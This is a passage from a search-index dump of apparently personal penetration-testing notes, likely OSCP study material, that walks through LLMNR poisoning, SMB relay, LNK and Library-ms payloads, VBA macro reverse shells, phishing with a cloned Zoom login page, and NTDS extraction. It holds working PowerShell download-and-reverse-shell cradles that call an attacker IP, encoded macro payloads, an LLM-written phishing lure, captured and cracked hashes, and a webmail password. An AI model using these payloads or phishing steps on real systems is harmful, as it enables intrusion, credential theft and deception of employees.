If DNS fails for local names, LLMNR is used to resolve local names Jane\u2019s laptop queries the local network for <code>printer1</code> using LLMNR, as DNS does not have a record for it. LLMNR resolves <code>printer1</code> to the IP address <code>192.168.1.20</code>. Network Communication Device communicates with servers or resources based on resolved IP addresses Jane\u2019s browser connects to <code>93.184.216.34</code> for web content, and her laptop sends print jobs to <code>192.168.1.20</code>. Website loads, and print job is processed by the local printer."},{"location":"pentest/initial/llmnr/#llmnr-attack","title":"LLMNR ATTACK","text":"<pre><code>1. Run Responder (Morning or after lunch)\n2. An event occur\n3. Capture Hash\n4. Crack Hash\n</code></pre> <p>Run Responder to capture hash (Ensure HTTP and SMB are ON)</p> <pre><code>sudo responder -I &lt;NIC&gt; -dPv\n</code></pre> <p>When an event is triggered, NTLMv2 Hash will be captured.</p> <p>Crack NTLMv2 Hash</p> <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show\n</code></pre> <p>Note: In a virtual machine, hash-cracking tasks typically rely on the CPU, which is not as efficient for this purpose. Graphics cards (GPUs), with their superior parallel processing capabilities, are the primary drivers for efficient hash-cracking.</p>"},{"location":"pentest/initial/llmnr/#mitigation","title":"Mitigation","text":"<ul> <li>Disable Multicast Name Resolution (LLMNR): Prevents the exploitation of LLMNR for name resolution poisoning attacks.</li> <li>Turn off NetBIOS over TCP/IP: Reduces the risk of NetBIOS Name Service (NBT-NS) spoofing, which can lead to unauthorized access to network resources.</li> </ul>"},{"location":"pentest/initial/passback/","title":"Passback Attack","text":"<p>Multi-Function Peripherals (MFPs), such as printers and copiers, are often overlooked in penetration testing but can be valuable targets. They have network connectivity and storage for credentials, making them potential entry points into a network.</p> <ul> <li>MFP Capabilities: MFPs are equipped with network ports, USB drives, and interfaces for functions like printing, scanning, and emailing.</li> <li>LDAP Integration: MFPs often use Lightweight Directory Access Protocol (LDAP) for authentication and directory lookups. This integration can store and transmit sensitive credentials.</li> </ul>"},{"location":"pentest/initial/passback/#how-passback-attack-works","title":"How Passback Attack works?","text":"<ol> <li>Access Embedded Web Service (EWS): Most MFPs can be accessed via a web interface with default credentials.</li> <li>Modify LDAP Settings: Change the LDAP server settings in the MFP to point to a malicious server.</li> <li>Capture Credentials: Set up a listener to capture LDAP authentication attempts from users. Credentials stored for LDAP or used during email lookups can be intercepted.</li> <li>Expand Attack: Besides LDAP, attacks can target SMTP settings and Windows sign-in configurations on the MFP to capture additional credentials.</li> </ol>"},{"location":"pentest/initial/passback/#tools-and-resources","title":"Tools and Resources","text":"<ul> <li>Tools like <code>PRET</code> and <code>Praeda</code> can assist in exploiting MFPs by providing capabilities for information disclosure and code execution.</li> </ul>"},{"location":"pentest/initial/passback/#mitigations","title":"Mitigations","text":"<ul> <li>Regularly update MFP firmware, change default credentials, and secure network configurations to protect against such attacks.</li> </ul> <p>Note: MFPs are often under-secured and can be exploited to gain network access and escalate privileges. Their physical accessibility and poor management make them prime targets in penetration testing.</p>"},{"location":"pentest/initial/smbrelay/","title":"SMB relay Attack","text":"<p>Identify Hosts without SMB Signing</p> <pre><code>nmap --script=smb2-security-mode.nse -p445 &lt;IP/CIDR&gt; -Pn\n</code></pre> <p>Edit responder config file</p> <pre><code>sudo mousepad /etc/responder/Responder.conf\n</code></pre> <p>Run responder</p> <pre><code>sudo responder -I &lt;NIC&gt; -dvP\n</code></pre> <p>Setup relay to get hash dump </p> <pre><code>sudo ntlmrelayx.py -tf &lt;TARGETS FILE&gt; -smb2support\n</code></pre> <p>Setup a listener and get a shell</p> <pre><code>sudo ntlmrelayx.py -tf &lt;TARGETS FILE&gt; -smb2support -i\nnc 127.0.0.1 11000\n</code></pre> <p>Running commands with relay</p> <pre><code>sudo ntlmrelayx.py -tf &lt;TARGETS FILE&gt; -smb2support -c \"&lt;COMMAND&gt;\"\n</code></pre>","tags":["SMB"]},{"location":"pentest/initial/smbrelay/#mitigation","title":"Mitigation","text":"Method Description Enable SMB Signing Protects SMB communication from man-in-the-middle attacks by encrypting and authenticating traffic. Disable NTLM Authentication Prevents the use of the outdated and vulnerable NTLM protocol, enforcing more secure Kerberos auth. Account Tiering Organizes accounts by access levels to limit lateral movement and minimize compromise impact. Local Admin Restriction Reduces the number of local administrators to lower the attack surface and limit privilege escalation.","tags":["SMB"]},{"location":"pentest/initial/lnk/cl-ms/","title":"Config-Library","text":"<p>When victim clicks the <code>config.Library-ms</code> file, it will trigger the download of <code>automatic_configuration.lnk</code> which will then activate <code>powercat.ps1</code> and making a connection back to ATTACKER!</p> <p>Setup the server</p> <pre><code>wsgidav --host=&lt;HOST_IP&gt; --port=&lt;PORT&gt; --auth=&lt;AUTH_TYPE&gt; --root=&lt;DOCUMENT_ROOT&gt;\nwsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre> <p>Create <code>config.Library-ms</code> on Vsc</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://192.168.45.224&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre> <p>Save and click the file. Observe connection to the <code>Webdav</code> server and downloaded <code>test.txt</code> located on the server</p> <pre><code>      &lt;simpleLocation&gt;\n        &lt;url&gt;\\\\192.168.45.224\\DavWWWRoot&lt;/url&gt;\n        &lt;serialized&gt;MBAAAEAFCAAAAAAAADAAAAAAAYkgCAQDQAAAAAgVwmD0dtdAAYFs5AdXbHAAWBbOQ312BAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA0EAAAAHAAAACAAAAAAAAAAAAAAAcAAAAwEAAAAMAAAACAAAAQBAAAAAAAAAAAgLAwFXxkjMuEjN44CN14iMyQDXEFkVXd1VS90TUBAA+DAAAwAAAAKFA8BWNoBLwHivQNEiwO3Z8b5788LAAAQuAs7rTuzqAQAAAAAAA0CAAAQMTB1UzNU5K47Qt+UhknG3GODmuFBAAAwCAAAAAsAAAAw//DAAAAAAA0EAAAQMTB1UwEfJ3++RaARpxLAYM656sGDAAAgCAAAAA8BAAAwDAAAAxAQOAIDAuAQMAYDA4AgLAQDA1AgLAIDAyAANAAAAAAAAAAAAtAAAAEzUQNlOk2r3zezgDF55Ehp2pU5qRAAAAMAAAAAATAAAAAAAAAAAAAAAAAAAAAAAhAwwAACXcFTOy4SM2gjL0UjLyIDNcRUY2d1VXJ1bvRHAAAAFDAAABAAAgyFXxkjMuEjN44CN14iMyQDXEFmdXd1VS92b0BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcBAXAEDA5AgMA4CAxAgNAgDAuAANAUDAuAgMAIDA0AAXAQEAhBgdAcFAXBwVAIFAvBwblt;/serialized&gt;\n      &lt;/simpleLocation&gt;\n</code></pre> <p>Revert the settings back to avoid running into issues</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://192.168.45.224&lt;/url&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre> <p>Create a LNK file embedding the following code</p> <pre><code>powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1');\npowercat -c 192.168.45.224 -p 443 -e powershell\"\n</code></pre> <p>Note:  - Type in the rest of the command as the space allowed for copy pasting is limited - Check if LNK file works (Double click) - Ensure <code>powercat</code>, LNK file are present in the webdav server root directory</p>"},{"location":"pentest/initial/lnk/lnk/","title":"LNK","text":""},{"location":"pentest/initial/lnk/lnk/#what-is-a-lnk-file","title":"What Is a LNK File?","text":"<p>A shortcut file in Windows that points to a file, folder, or application.  </p>"},{"location":"pentest/initial/lnk/lnk/#how-lnk-file-attacks-work","title":"How LNK File Attacks Work","text":"<ol> <li>Malicious LNK Creation: An attacker creates a LNK file that contains embedded malicious payloads or commands.</li> <li>File Placement: The LNK file is placed in a location where users are likely to encounter it, such as shared folders, downloads, or removable media.</li> <li>Execution: When a user opens the LNK file, it executes the embedded payload or command, potentially leading to malware execution or system compromise.</li> </ol>"},{"location":"pentest/initial/lnk/lnk/#additional-resources","title":"Additional Resources","text":"<ul> <li>Execution via .RTF</li> </ul>"},{"location":"pentest/initial/lnk/lnk/#mitigation","title":"Mitigation","text":"Method Description Disable LNK File Execution from Untrusted Sources Configure system policies to prevent the execution of LNK files from untrusted or unexpected locations. Implement Least Privilege Restrict user permissions to minimize the impact of LNK file execution, ensuring users only have the necessary access rights."},{"location":"pentest/initial/lnk/nxc/","title":"Netexec","text":"<pre><code>netexec smb &lt;TARGET IP&gt; -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -M slinky -o NAME=&lt;NAME&gt; SERVER=&lt;ATTACKER IP&gt;\n</code></pre>"},{"location":"pentest/initial/lnk/phishing/","title":"Phishing","text":""},{"location":"pentest/initial/lnk/phishing/#use-configlibrary-ms-and-lnk-file","title":"Use <code>config.Library-ms</code> and <code>.lnk</code> file","text":"<p>Start the <code>webdav</code> server</p> <pre><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .\nRunning without configuration file.\n15:02:36.530 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n15:02:36.533 - INFO    : WsgiDAV/4.3.3 Python/3.12.6 Linux-6.11.2-amd64-x86_64-with-glibc2.40\n15:02:36.533 - INFO    : Lock manager:      LockManager(LockStorageDict)\n15:02:36.534 - INFO    : Property manager:  None\n15:02:36.534 - INFO    : Domain controller: SimpleDomainController()\n15:02:36.534 - INFO    : Registered DAV providers by route:\n15:02:36.534 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/lib/python3/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n15:02:36.534 - INFO    :   - '/': FilesystemProvider for path '/home/kali/OSCP/11/11.3/vmpgroup2' (Read-Write) (anonymous)\n15:02:36.534 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n15:02:36.534 - WARNING : Share '/' will allow anonymous write access.\n15:02:36.534 - WARNING : Share '/:dir_browser' will allow anonymous write access.\n15:02:36.648 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.1 Python/3.12.6\n15:02:36.648 - INFO    : Serving on http://0.0.0.0:80 ...\n</code></pre> <p>Start python server </p> <pre><code>python3 -m http.server 80\n</code></pre> <p>Start a listener</p> <pre><code>nc -lvnp 443\n</code></pre> <p>Send a phishing email to target</p> <pre><code>swaks --server &lt;SMTP_SERVER&gt; -t &lt;TARGET_EMAIL&gt; --from &lt;FAKE_SENDER_EMAIL&gt; --header \"Subject: &lt;SUBJECT_LINE&gt;\" --body @&lt;EMAIL_BODY_FILE&gt; --attach @&lt;ATTACHMENT_FILE&gt; --suppress-data -ap\n\nswaks --server 192.168.234.199 -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --header \"Subject: Staging Script\" --body @body.txt --attach @config.Library-ms --suppress-data -ap\n\nsendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.223.140:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a Document.ods\n</code></pre> <p>Get shell when someone opens the mail</p> <p>Login to the webmail</p> <pre><code>helpdesk@mail.corp.com:Helpdesk@Password2024\n</code></pre> <p>Enumerate the sent mails</p> <pre><code>\"Hello Sales department, \n\nHope you're knocking it out of the park this week! We're trying to redo our inventory of Zoom licenses as we seem to have a large number which aren't being used at the moment. Rather than having everyone reply to the email, in order to keep your Zoom license, please just ensure that you login to your account and schedule a meeting within the next two weeks. Any accounts which don't do this within the time frame will be transitioned to a free license. \n\nThank you very much for your cooperation and apologies for the hassle!\" \n\nWrite another email in the same style as this, and include a reminder for employees to login to Zoom. Include a hyperlink that can be clicked and directs people to the appropriate page.  \n</code></pre> <p>Take the email as sample to an LLM, along with a prompt, to write an email in the same style</p> <pre><code>Subject: Reminder: Please Log In to Keep Your Zoom License!\n\nHello Sales department,\n\nJust a quick reminder\u2014hope everything\u2019s going smoothly on your end! We\u2019re still working on updating our Zoom license inventory and noticed that some accounts haven\u2019t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.\n\nIf no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.\n\nThanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.\n\nBest regards,\n[Your Company] Helpdesk Team\n</code></pre>"},{"location":"pentest/initial/lnk/phishing/#clone-a-legitimate-website","title":"Clone a Legitimate Website","text":"<pre><code>wget -E -k -K -p -e robots=off -H -Dzoom.us -nd \"https://zoom.us/signin#/login\"\n</code></pre> <p><code>-E</code>: Change file extension to match the MIME type of the downloaded file <code>-k</code>: Convert all links in the document to point to local alternatives <code>-K</code>: Save original file with <code>.orig</code> <code>-p</code>: Download all the files necessary for viewing <code>-e robots=off</code>: Ignore <code>robots.txt</code> <code>-H</code>: Download from external hosts, limited to files on <code>zoom.us</code> <code>-nd</code>: Save files in a flat directory structure in current working directory Launch the website with <code>python3</code></p> <pre><code>python3 -m http.server 80\n</code></pre> <p>Access the page (Note: <code>OWASP CSRF Guard error alert box</code>) Search files in the directory for <code>OWASP</code> and <code>csrf_js</code></p> <pre><code>grep \"OWASP\" *\ngrep \"csrf_js\" *\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/OSCP/13/new_content]\n\u2514\u2500$ grep \"OWASP\" *\ncsrf_js: * The OWASP CSRFGuard Project, BSD License\ncsrf_js: *    3. Neither the name of OWASP nor the names of its contributors may be used\ncsrf_js:                    this.setRequestHeader(\"X-Requested-With\", \"OWASP CSRFGuard Project\");\ncsrf_js:        alert(\"OWASP CSRFGuard JavaScript was included from within an unauthorized domain!\");\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/OSCP/13/new_content]\n\u2514\u2500$ grep \"csrf_js\" *\ncsrf_js:        xhr.open(\"POST\", \"/csrf_js\"+(typeof(resourceAccountIdRoutingURl)!=\"undefined\"?\"?\"+resourceAccountIdRoutingURl:\"\"), false);\ncsrf_js:            xhr.open(\"POST\", \"/csrf_js\"+(typeof(resourceAccountIdRoutingURl)!=\"undefined\"?\"?\"+resourceAccountIdRoutingURl:\"\"), false);\nsignin.html:&lt;script nonce=\"lNBoeXlATvmgxqcsDz-4OA\" src=\"csrf_js\"&gt;&lt;/script&gt;\nsignin.orig:&lt;script nonce=\"lNBoeXlATvmgxqcsDz-4OA\" src=\"/csrf_js\"&gt;&lt;/script&gt;\n\n</code></pre> <p>Delete the lines and Check the cloned <code>website</code> for any problems Move the page to a proper web server for better support of POST requests</p> <pre><code>mv -f * /var/www/html\nsystemctl start apache2\ncd /var/www/html\n</code></pre> <p>To make a replica of the login page - Figure out how the login page works - Use LLM to write a form and overwrite the current source code - Make a copy of the current page and compare to the original Send the phishing email to the targets and wait for an event.</p>"},{"location":"pentest/initial/lnk/ps/","title":"PowerShell","text":"<pre><code>powershell -ep bypass\n\n$objShell = New-Object -ComObject WScript.shell\n$lnk = $objShell.CreateShortcut(\"C:\\test.lnk\")\n$lnk.TargetPath = \"\\\\192.168.138.149\\@test.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"Test\"\n$lnk.HotKey = \"Ctrl+Alt+T\"\n$lnk.Save()\n</code></pre> <p>Capture hash with responder</p> <pre><code>sudo responder -I &lt;NIC&gt; -dPv\nsudo responder -I tun0 -dPv\n</code></pre>"},{"location":"pentest/initial/macro/doc/","title":".doc","text":"<p>Create a blank Word document and save it in <code>.doc</code> format Create a Macro (Set the <code>Macros</code> in to the current <code>.doc</code> file) Edit the Macro as shown below</p> <pre><code>Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre> <p>Encode reverse shell code at here (Destination character set <code>UTF-16LE</code>)</p> <pre><code>IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224/powercat.ps1');powercat -c 192.168.45.224 -p 4444 -e powershell \n\nSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA\n</code></pre> <p>Breakdown shell code</p> <pre><code>str = \"powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...\"\n\nn = 50\n\nfor i in range(0, len(str), n):\n    print(\"Str = Str + \" + '\"' + str[i:i+n] + '\"')\n</code></pre> <p>Run the script</p> <pre><code>python script.py  \nStr = Str + \"powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd\"\nStr = Str + \"wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA\"\nStr = Str + \"uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA\"\nStr = Str + \"GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI\"\nStr = Str + \"ALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAY\"\nStr = Str + \"QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB\"\nStr = Str + \"jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwA\"\nStr = Str + \"CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw\"\nStr = Str + \"A\"\n</code></pre> <p>Update the MACRO</p> <pre><code>Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n\n    Str = Str + \"powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd\"\n    Str = Str + \"wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA\"\n    Str = Str + \"uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA\"\n    Str = Str + \"GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI\"\n    Str = Str + \"ALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAY\"\n    Str = Str + \"QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB\"\n    Str = Str + \"jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwA\"\n    Str = Str + \"CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw\"\n    Str = Str + \"A\"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre> <p>Note: Without splitting, a very long string assigned directly to a variable may cause VBA to fail or behave unexpectedly</p>"},{"location":"pentest/initial/macro/odt/","title":"TODO","text":""},{"location":"pentest/initial/url/attack/","title":"How to ?","text":""},{"location":"pentest/initial/url/attack/#create-a-file","title":"Create a file","text":"<pre><code>[InternetShortcut]\nURL=anything\nWorkingDirectory=anything\nIconFile=\\\\192.168.45.246\\%USERNAME%.icon\nIconIndex=1\n</code></pre> <pre><code>[InternetShortcut]\nURL=\\\\[Listener-IP]\\share\n</code></pre> <p>Remarks: Upload file to target</p>"},{"location":"pentest/initial/url/attack/#start-responder","title":"Start responder","text":"<pre><code>sudo responder -I tun0 -dPv\n</code></pre>"},{"location":"pentest/initial/url/attack/#check-responder","title":"Check responder","text":"<pre><code>[SMB] NTLMv2-SSP Client   : 192.168.209.172\n[SMB] NTLMv2-SSP Username : VAULT\\anirudh\n[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:5890c572e06befc8:ECB08D0AD8499FFBAB60B64565D4EC5A:010100000000000080854C694607DC0176A52C826D4F7D2F0000000002000800520034004300340001001E005700490\n04E002D005400490058004F0058004500350057004A0034004D0004003400570049004E002D005400490058004F0058004500350057004A0034004D002E0052003400430034002E004C004F00430041004C0003001400520034004300340\n02E004C004F00430041004C000500140052003400430034002E004C004F00430041004C000700080080854C694607DC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C\n4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340036000000000000000000\n</code></pre>"},{"location":"pentest/initial/url/attack/#crack-hash","title":"Crack hash","text":"<pre><code>hashcat -m 5600 anirudh_hash \"$rock\" --force --show\nANIRUDH::VAULT:5890c572e06befc8:ecb08d0ad8499ffbab60b64565d4ec5a:010100000000000080854c694607dc0176a52c826d4f7d2f0000000002000800520034004300340001001e00570049004e002d005400490058004f0058004500350057004a0034004d0004003400570049004e002d005400490058004f0058004500350057004a0034004d002e0052003400430034002e004c004f00430041004c000300140052003400430034002e004c004f00430041004c000500140052003400430034002e004c004f00430041004c000700080080854c694607dc01060004000200000008003000300000000000000001000000002000001830f0c706803f0173332094f5b2bb5fb0c4dad79922348512363cc7dc51c8100a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200340036000000000000000000:SecureHM\n</code></pre>"},{"location":"pentest/initial/url/url/","title":"URL","text":""},{"location":"pentest/initial/url/url/#what-is-a-url-file","title":"What Is a URL File?","text":"<p>An Internet shortcut \u2014 a simple text file that points to a web address</p>"},{"location":"pentest/initial/url/url/#how-url-file-attacks-work","title":"How URL File Attacks Work","text":"<p>When a user double-clicks a <code>.url</code> file, it opens a browser and navigates to the specified URL</p> File Type Description <code>.url</code> A shortcut file that contains a URL pointing to a remote server. <code>.scf</code> A Shell Command File configured to initiate a connection to a remote server. <code>.lnk</code> A Windows shortcut file crafted to point to a remote server."},{"location":"pentest/postex/shadowcopy/","title":"Shadowcopy","text":"<p>A\u00a0Shadow Copy, also known as\u00a0Volume Shadow Service\u00a0(VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.</p> <p>Create a shadow copy</p> <pre><code>C:\\Tools&gt;vshadow.exe -nw -p  C:\n\nVSHADOW.EXE 3.0 - Volume Shadow Copy sample client.\nCopyright (C) 2005 Microsoft Corporation. All rights reserved.\n\n\n(Option: No-writers option detected)\n(Option: Create shadow copy set)\n- Setting the VSS context to: 0x00000010\nCreating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...\n- Adding volume \\\\?\\Volume{bac86217-0fb1-4a10-8520-482676e08191}\\ [C:\\] to the shadow set...\nCreating the shadow (DoSnapshotSet) ...\n(Waiting for the asynchronous operation to finish...)\nShadow copy set succesfully created.\n\nList of created shadow copies:\n\n\nQuerying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...\n\n* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...\n   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}\n   - Original count of shadow copies = 1\n   - Original Volume name: \\\\?\\Volume{bac86217-0fb1-4a10-8520-482676e08191}\\ [C:\\]\n   - Creation Time: 9/19/2022 4:31:51 AM\n   - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n   - Originating machine: DC1.corp.com\n   - Service machine: DC1.corp.com\n   - Not Exposed\n   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}\n   - Attributes:  Auto_Release No_Writers Differential\nSnapshot creation done.\n</code></pre> <p><code>-nw</code>: To disable writers <code>-p</code>: To store copy on disk Note: Name of the shadow copy device =&gt; <code>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2</code></p> <p>Copy the entire AD database <code>ntds.dit</code></p> <pre><code>C:\\Tools&gt;copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak\n   1 file(s) copied.\n</code></pre> <p>Save the SYSTEM hive from the Windows registry</p> <pre><code>C:\\&gt;reg.exe save hklm\\system c:\\system.bak\nThe operation completed successfully.\n</code></pre> <p>Secrets dump the credentials</p> <pre><code>kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533\n[*] Reading and decrypting hashes from ntds.dit.bak\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::\ndave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::\nstephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::\njeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::\njeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::\niis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::\nWEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::\nFILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::\nCLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::\nCLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::\npete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::\njen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::\nCLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::\n[*] Kerberos keys from 